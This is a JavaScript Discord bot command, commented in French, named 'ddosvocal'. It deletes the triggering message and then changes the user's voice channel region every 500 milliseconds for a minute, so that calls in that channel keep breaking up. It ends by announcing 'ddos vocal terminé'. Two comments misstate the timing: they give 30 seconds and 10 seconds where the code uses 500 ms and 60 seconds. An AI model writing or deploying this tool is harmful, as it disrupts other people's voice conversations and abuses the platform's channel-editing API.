// Déclarez un tableau de trois régions possibles
const regions = ["us-east", "us-west", "europe"];

// Stockez l'index de la région actuelle
let currentRegionIndex = 0;

// Stockez la dernière région changée
let lastRegion = null;

// Créez une variable pour stocker l'intervalle de changement de région
let regionChangeInterval;

module.exports = {
    name: "ddosvocal",
    aliases: [],
    description: "Change rapidement la région vocale du salon.",
    run: async (message, args, command, client) => {
        if (message.author.bot) {
            // Ignorer les commandes des bots
            return;
        }

        if (message.member.voice.channel) {
            // Supprimer le message de la commande
            message.delete().catch(error => {
                console.error(`Impossible de supprimer le message de la commande : ${error}`);
            });

            // Démarrez l'intervalle pour changer de région
            regionChangeInterval = setInterval(() => {
                // Obtenez la prochaine région à partir du tableau
                const nextRegion = regions[currentRegionIndex];

                try {
                    // Vérifiez si la région actuelle est "automatic"
                    if (message.member.voice.channel.region !== "automatic") {
                        // Changez la région du salon vocal
                        message.member.voice.channel.edit({ region: nextRegion });

                        // Vérifiez si la région a changé
                        if (nextRegion !== lastRegion) {
                            lastRegion = nextRegion;
                        }
                    } else {
                        message.channel.send("La région vocale actuelle est 'automatic', aucune modification nécessaire.");
                    }

                    // Incrémentez l'index pour passer à la prochaine région
                    currentRegionIndex = (currentRegionIndex + 1) % regions.length;
                } catch (error) {
                    console.error(`Impossible de changer la région vocale : ${error}`);
                    message.channel.send("Une erreur s'est produite lors de la modification de la région vocale.");
                    clearInterval(regionChangeInterval); // Arrêtez l'intervalle en cas d'erreur
                }
            }, 500); // Changez de région toutes les 30 secondes (vous pouvez ajuster cet intervalle)

            // Arrêtez l'intervalle automatiquement après 10 secondes
            setTimeout(() => {
                clearInterval(regionChangeInterval);
                message.channel.send("ddos vocal terminé.");
            }, 60000); // 60 secondes

        } else {
            message.channel.send("Vous devez être connecté à un salon vocal pour utiliser cette commande.");
        }
    }
};
